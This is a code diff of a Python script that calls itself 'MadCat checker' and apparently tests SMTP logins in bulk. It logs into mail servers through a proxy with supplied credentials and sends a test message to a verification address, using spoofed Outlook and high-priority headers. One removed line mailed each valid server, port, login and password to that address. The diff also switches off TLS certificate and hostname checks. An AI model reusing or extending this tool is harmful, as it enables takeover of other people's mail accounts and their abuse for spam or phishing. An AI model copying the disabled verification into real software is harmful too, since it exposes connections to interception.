@@ -124,7 +124,7 @@ def debug(msg):
     global debuglevel, results_que
     debuglevel and results_que.put(msg)
 
-def load_smtp_configs(file_path = '2.txt'):
+def load_smtp_configs(file_path='autoconfigs_enriched.txt'):
     global domain_configs_cache
     try:
         with open(file_path, 'r', encoding='utf-8') as file:
@@ -138,7 +138,6 @@ def load_smtp_configs(file_path = '2.txt'):
     except Exception as e:
         print(err + 'Failed to load SMTP configs from file. ' + str(e))
         print(err + 'Performance will be affected.')
-
 
 def first(a):
     return (a or [''])[0]
@@ -361,6 +360,8 @@ def socket_get_free_smtp_server(smtp_server, port, retries=3, delay=2):
 
             if port == 465:
                 context = ssl.create_default_context()
+                context.check_hostname = False  # Disable hostname checking for self-signed certificates
+                context.verify_mode = ssl.CERT_NONE  # Disable certificate verification for self-signed certificates
                 s = context.wrap_socket(sock_proxy, server_hostname=smtp_server)
             else:
                 s = sock_proxy
@@ -414,6 +415,10 @@ def socket_try_login(sock, self_host, smtp_login, smtp_password, retries=3, dela
                 time.sleep(delay)
             else:
                 raise
+
+def generate_random_message():
+    length = random.randint(8, 15)
+    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))
 
 def socket_try_mail(sock, smtp_from, smtp_to, data, retries=3, delay=2):
     """
@@ -487,12 +492,12 @@ def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password
             s.close()
             return True
         headers_arr = [
-            'From: MadCat checker <%s>'%smtp_user,
+            'From: MadCat checker <%s>' % smtp_user,
             'Resent-From: admin@localhost',
-            'To: '+verify_email,
+            'To: ' + verify_email,
             'Subject: new SMTP from MadCat checker',
-            'Return-Path: '+smtp_user,
-            'Reply-To: '+smtp_user,
+            'Return-Path: ' + smtp_user,
+            'Reply-To: ' + smtp_user,
             'X-Priority: 1',
             'X-MSmail-Priority: High',
             'X-Mailer: Microsoft Office Outlook, Build 10.0.5610',
@@ -501,8 +506,8 @@ def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password
             'Content-Type: text/html; charset="utf-8"',
             'Content-Transfer-Encoding: 8bit'
         ]
-        body = f'{smtp_server}|{port}|{smtp_login}|{password}'
-        message_as_str = '\r\n'.join(headers_arr+['', body, '.', ''])
+        body = generate_random_message()
+        message_as_str = '\r\n'.join(headers_arr + ['', body, '.', ''])
         return socket_try_mail(s, smtp_user, verify_email, message_as_str)
     s.close()
     raise Exception(answer)
